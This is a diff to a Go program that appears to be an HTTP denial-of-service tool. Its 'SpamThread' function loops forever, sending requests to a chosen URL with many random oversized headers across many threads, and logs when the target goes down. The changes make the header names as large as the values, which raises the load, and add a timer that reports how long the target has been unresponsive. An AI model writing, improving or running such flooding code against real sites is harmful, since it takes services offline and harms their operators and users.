@@ -5,6 +5,7 @@ import (
 	"log"
 	"math/rand"
 	"net/http"
+	"time"
 )
 
 func main() {
@@ -65,14 +66,14 @@ func main() {
 		}
 
 	}
-	fmt.Print("\n\n\n==================================================\n")
+	fmt.Print("\n\n\n=============================================================\n")
 	fmt.Println("URL              = " + URL)
 	fmt.Println("Method           = " + Method)
 	fmt.Printf("Threads          = %d \n", Threads)
 	fmt.Printf("HPR              = %d \n", HPR)
 	fmt.Printf("Header size      = %d \n\n", +HeaderSizeChar)
 	fmt.Println("Log only down     = " + SHOWONLYDOWN)
-	fmt.Print("================================================== \n")
+	fmt.Print("============================================================= \n")
 	fmt.Printf("confirm [Y/n] -> ")
 	fmt.Scanln(&confirmed)
 	var i int
@@ -105,7 +106,7 @@ func SpamThread(URL string, Method string, HeaderSize int, HPR int, OnlyDown str
 
 	var i int
 	for i = 0; i < HPR; i++ {
-		req.Header.Add(RandStringRunes(25), RandStringRunes(HeaderSize))
+		req.Header.Add(RandStringRunes(HeaderSize), RandStringRunes(HeaderSize))
 	}
 
 	for {
@@ -113,15 +114,18 @@ func SpamThread(URL string, Method string, HeaderSize int, HPR int, OnlyDown str
 		resp, err := client.Do(req)
 
 		if err != nil {
-			log.Println(err.Error())
-		}
-
-		if resp.StatusCode == 200 {
-			if OnlyDown == "n" || OnlyDown == "N" {
-				log.Println("[ " + URL + " ]- OK")
-			}
+			NotResponded(URL)
 		} else {
-			log.Println("[ " + URL + " ] - is down")
+			if resp.StatusCode == 200 {
+				if OnlyDown == "n" || OnlyDown == "N" {
+
+					log.Println("[ " + URL + " ]- OK")
+				}
+				LastRespond = time.Now()
+			} else {
+				log.Println(resp.StatusCode)
+				NotResponded(URL)
+			}
 		}
 	}
 }
@@ -132,4 +136,11 @@ func RandStringRunes(n int) string {
 		b[i] = letterRunes[rand.Intn(len(letterRunes))]
 	}
 	return string(b)
+}
+
+var LastRespond time.Time
+
+func NotResponded(URL string) {
+	duration := time.Now().Sub(LastRespond)
+	log.Printf("[ " + URL + " ] - is down from " + string(duration.String()) + "\n")
 }
